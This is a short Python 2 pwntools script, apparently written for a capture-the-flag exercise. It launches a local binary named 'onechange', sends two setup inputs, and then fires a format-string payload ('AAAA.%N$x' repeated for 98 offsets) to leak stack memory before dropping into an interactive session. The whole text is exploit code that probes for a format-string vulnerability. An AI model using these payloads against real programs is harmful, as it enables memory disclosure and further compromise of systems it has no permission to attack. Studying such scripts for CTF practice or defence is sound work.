from pwn import *

p = process("./onechange")

print p.recv()

p.sendline("re7.py")

print p.recv()
p.sendline("99")

print p.recv()

payload = ""
for i in range(1,99):
	payload += "AAAA.%"+str(i)+"$x\n"
	print payload
p.sendline(payload)
print p.recv()
p.interactive()
